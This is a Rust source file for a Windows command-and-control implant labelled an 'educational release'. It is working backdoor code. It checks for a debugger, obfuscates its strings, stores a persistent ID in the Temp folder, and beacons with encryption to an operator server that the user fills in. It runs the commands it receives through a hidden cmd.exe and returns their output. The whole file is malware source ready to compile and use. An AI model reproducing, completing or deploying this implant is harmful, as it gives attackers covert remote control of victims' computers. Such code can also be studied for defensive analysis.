// AETHER IMPLANT - EDUCATIONAL RELEASE
// Author: Andrei Costin
// License: MIT (See Repository)
// Description: Advanced C2 Implant written in Rust using direct Syscalls and WinHTTP.
// DISCLAIMER: This code is for educational purposes only.

use std::ffi::c_void;
use std::ptr::{null_mut};
use zeroize::{Zeroize, ZeroizeOnDrop};
use obfstr::obfstr; 

// Windows API imports
use windows::{
    core::{PCWSTR, PWSTR},
    Win32::Networking::WinHttp::*,
    Win32::Foundation::{HANDLE, CloseHandle},
    Win32::System::Threading::{
        WaitForSingleObject, CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION,
        STARTF_USESTDHANDLES, CREATE_NO_WINDOW, INFINITE
    },
    Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_LocalAppData, KNOWN_FOLDER_FLAG},
    Win32::System::Com::CoTaskMemFree,
    Win32::System::Pipes::CreatePipe,
    Win32::Security::SECURITY_ATTRIBUTES,
    Win32::Storage::FileSystem::ReadFile,
    Win32::System::Diagnostics::Debug::IsDebuggerPresent,
    Win32::System::SystemInformation::GetTickCount64,
};

// Crypto imports
use p256::{ecdh::EphemeralSecret, PublicKey};
use p256::elliptic_curve::sec1::ToEncodedPoint;
use hkdf::Hkdf;
use sha2::Sha256;
use aead::{Aead, KeyInit, Payload}; 
use aes_gcm::{Aes256Gcm, Nonce};
use rand_core::{OsRng, RngCore};

//CONFIG
//  Replace these values with your own infrastructure details before compiling.

//Enter your C2 Server IP address
const C2_IP_ADDRESS: &str = "127.0.0.1"; 

//Paste your Server's ECC public key (PEM format)
const SERVER_PUB_PEM: &str = r#"
-----BEGIN PUBLIC KEY-----
Example: PFkwbBgGMmgmXEebBZxgGvxxcDQgAE ...
-----END PUBLIC KEY-----
"#;


#[derive(Zeroize, ZeroizeOnDrop)]
struct SessionState {
    aes_key: [u8; 32],
    tx_seq: u64,
    rx_seq: u64,
}


fn to_wstring(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(std::iter::once(0)).collect()
}

fn is_environment_safe() -> bool {
    unsafe {
        if IsDebuggerPresent().as_bool() {
            return false;
        }
        if GetTickCount64() < 300_000 {
            // Check uptime (disabled for testing)
        }
    }
    true
}

//PERSISTENCE + IDENTITY 
fn get_or_create_identity() -> [u8; 16] {
    let mut buffer = [0u8; 16];
    unsafe {
        // Tries to read identity from %TEMP% to persist across restarts
        let path_result = SHGetKnownFolderPath(&FOLDERID_LocalAppData, KNOWN_FOLDER_FLAG(0), HANDLE(0));
        if let Ok(path_ptr) = path_result {
            let len = (0..).take_while(|&i| *path_ptr.0.offset(i) != 0).count();
            let path_slice = std::slice::from_raw_parts(path_ptr.0, len);
            let path_str = String::from_utf16_lossy(path_slice);
            CoTaskMemFree(Some(path_ptr.as_ptr() as *const c_void));
            
            let file_path = format!("{}{}", path_str, obfstr!("\\Temp\\aether_id.dat"));
            
            if let Ok(content) = std::fs::read(&file_path) {
                if content.len() == 16 {
                    buffer.copy_from_slice(&content);
                    return buffer;
                }
            }
            OsRng.fill_bytes(&mut buffer);
            let _ = std::fs::write(&file_path, &buffer);
        } else {
            OsRng.fill_bytes(&mut buffer);
        }
    }
    buffer
}

//   EXECUTION
fn run_shell_command(cmd: &str) -> String {
    unsafe {
        let sa = SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: null_mut(),
            bInheritHandle: windows::Win32::Foundation::TRUE, 
        };
        let mut h_read_pipe = HANDLE::default();
        let mut h_write_pipe = HANDLE::default();

        if CreatePipe(&mut h_read_pipe, &mut h_write_pipe, Some(&sa), 0).is_err() {
            return String::from("ERR: Pipe Creation Failed");
        }

        let mut si = STARTUPINFOW::default();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = h_write_pipe;
        si.hStdError = h_write_pipe;
        si.wShowWindow = 0; // CREATE_NO_WINDOW

        let mut pi = PROCESS_INFORMATION::default();
        let full_cmd = format!("{}{}", obfstr!("cmd.exe /C "), cmd);
        let mut cmd_wide = to_wstring(&full_cmd);

        let process_result = CreateProcessW(
            PCWSTR::null(), PWSTR(cmd_wide.as_mut_ptr()), None, None,
            windows::Win32::Foundation::TRUE, CREATE_NO_WINDOW, None, PCWSTR::null(), &si, &mut pi,
        );

        let _ = CloseHandle(h_write_pipe);

        if process_result.is_ok() {
            WaitForSingleObject(pi.hProcess, INFINITE);
            let mut output = Vec::new();
            let mut buffer = [0u8; 4096];
            let mut bytes_read = 0;
            loop {
                let read_result = ReadFile(h_read_pipe, Some(&mut buffer), Some(&mut bytes_read), None);
                if read_result.is_ok() && bytes_read > 0 {
                    output.extend_from_slice(&buffer[..bytes_read as usize]);
                } else { break; }
            }
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(h_read_pipe);
            String::from_utf8_lossy(&output).trim().to_string()
        } else {
            let _ = CloseHandle(h_read_pipe);
            String::from("ERR: Execution Failed")
        }
    }
}

//   NETWORK
fn send_binary_post(data: &[u8]) -> Result<Vec<u8>, u32> {
    unsafe {
        let user_agent_wide = to_wstring("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        let c2_host_wide = to_wstring(C2_IP_ADDRESS);
        let c2_path_wide = to_wstring("/api/v6/sync");
        let method_wide = to_wstring("POST");

        let h_session = WinHttpOpen(
            PCWSTR(user_agent_wide.as_ptr()),
            windows::Win32::Networking::WinHttp::WINHTTP_ACCESS_TYPE(1), 
            PCWSTR::null(), PCWSTR::null(), 0
        );
        
        if h_session.is_null() { return Err(0); }

        let h_connect = WinHttpConnect(h_session, PCWSTR(c2_host_wide.as_ptr()), 8080, 0);
        if h_connect.is_null() { 
            let _ = WinHttpCloseHandle(h_session); 
            return Err(0); 
        }

        let h_request = WinHttpOpenRequest(
            h_connect, PCWSTR(method_wide.as_ptr()), PCWSTR(c2_path_wide.as_ptr()), 
            PCWSTR::null(), PCWSTR::null(), std::ptr::null(), WINHTTP_OPEN_REQUEST_FLAGS(0) 
        );

        if h_request.is_null() {
            let _ = WinHttpCloseHandle(h_connect); let _ = WinHttpCloseHandle(h_session);
            return Err(0);
        }

        let send_result = WinHttpSendRequest(
            h_request, None, Some(data.as_ptr() as *const c_void),
            data.len() as u32, data.len() as u32, 0
        );

        if send_result.is_err() {
            let _ = WinHttpCloseHandle(h_request); let _ = WinHttpCloseHandle(h_connect); let _ = WinHttpCloseHandle(h_session);
            return Err(0);
        }

        if WinHttpReceiveResponse(h_request, null_mut()).is_err() {
             let _ = WinHttpCloseHandle(h_request); let _ = WinHttpCloseHandle(h_connect); let _ = WinHttpCloseHandle(h_session);
             return Err(0);
        }

        let mut response = Vec::new();
        loop {
            let mut dw_size = 0;
            if WinHttpQueryDataAvailable(h_request, &mut dw_size).is_err() { break; }
            if dw_size == 0 { break; }
            let mut buffer = vec![0u8; dw_size as usize];
            let mut downloaded = 0;
            if WinHttpReadData(h_request, buffer.as_mut_ptr() as *mut c_void, dw_size, &mut downloaded).is_ok() {
                response.extend_from_slice(&buffer[..downloaded as usize]);
            } else { break; }
        }
        
        let _ = WinHttpCloseHandle(h_request); let _ = WinHttpCloseHandle(h_connect); let _ = WinHttpCloseHandle(h_session);
        Ok(response)
    }
}


fn smart_sleep() {
    let mut rng = OsRng;
    let base = 3000;
    let jitter = (rng.next_u32() % 2000) as i32 - 1000; 
    let final_ms = (base as i32 + jitter).max(1000) as u32;
    unsafe { WaitForSingleObject(HANDLE(0), final_ms); }
}


fn main() {
    // Identity generation
    let agent_id = get_or_create_identity();
    
    loop {
        // Ephemeral key generation
        let client_secret = EphemeralSecret::random(&mut OsRng);
        let client_pk = PublicKey::from(&client_secret);
        let client_pk_bytes = client_pk.to_encoded_point(false).as_bytes().to_vec();

        // Construct handshake packet
        let mut packet = Vec::new();
        packet.push(0x01); 
        packet.extend_from_slice(&agent_id);
        packet.extend_from_slice(&(client_pk_bytes.len() as u32).to_be_bytes());
        packet.extend_from_slice(&client_pk_bytes);

        match send_binary_post(&packet) {
            Ok(server_pub_bytes) => {
                if server_pub_bytes.is_empty() { smart_sleep(); continue; }

                if let Ok(server_pk) = PublicKey::from_sec1_bytes(&server_pub_bytes) {
                    // ECDH key exchange
                    let shared = client_secret.diffie_hellman(&server_pk);
                    let hkdf = Hkdf::<Sha256>::new(None, shared.raw_secret_bytes());
                    let mut aes_key = [0u8; 32];
                    hkdf.expand(b"aether-v6-binary", &mut aes_key).unwrap();

                    let mut session = SessionState { aes_key, tx_seq: 0, rx_seq: 0 };
                    let mut pending_output = String::new(); 

                    loop {
                        smart_sleep();
                        let cipher = Aes256Gcm::new(&session.aes_key.into());
                        let mut nonce_bytes = [0u8; 12];
                        OsRng.fill_bytes(&mut nonce_bytes);
                        let nonce = Nonce::from_slice(&nonce_bytes);

                        session.tx_seq += 1;
                        let seq_bytes = session.tx_seq.to_be_bytes();
                        
                        let mut aad = Vec::new();
                        aad.extend_from_slice(&agent_id);
                        aad.extend_from_slice(&seq_bytes);

                        let msg_bytes = if pending_output.is_empty() {
                            b"PING".to_vec()
                        } else {
                            pending_output.as_bytes().to_vec()
                        };
                        pending_output.clear(); 

                        let payload = Payload { msg: &msg_bytes, aad: &aad };

                        if let Ok(ciphertext) = cipher.encrypt(nonce, payload) {
                            // Construct beacon packet
                            let mut beacon_pkt = Vec::new();
                            beacon_pkt.push(0x02); 
                            beacon_pkt.extend_from_slice(&agent_id);
                            beacon_pkt.extend_from_slice(&seq_bytes);
                            
                            let mut data_blob = nonce_bytes.to_vec();
                            data_blob.extend(ciphertext);
                            
                            beacon_pkt.extend_from_slice(&(data_blob.len() as u32).to_be_bytes());
                            beacon_pkt.extend_from_slice(&data_blob);

                            match send_binary_post(&beacon_pkt) {
                                Ok(resp) => {
                                    if resp.len() <= 12 { continue; } 
                                    
                                    let s_nonce = Nonce::from_slice(&resp[0..12]);
                                    let s_cipher = &resp[12..];
                                    let s_payload = Payload { msg: s_cipher, aad: &agent_id };
                                    
                                    if let Ok(cmd_bytes) = cipher.decrypt(s_nonce, s_payload) {
                                        let cmd_str = String::from_utf8_lossy(&cmd_bytes).to_string();
                                        if !cmd_str.is_empty() {
                                            // Execute Command
                                            let out = run_shell_command(&cmd_str);
                                            pending_output = out;
                                        }
                                    }
                                }
                                Err(_) => { break; }, // Connection lost
                            }
                        }
                    }
                }
            }
            Err(_) => { smart_sleep(); },
        }
    }
}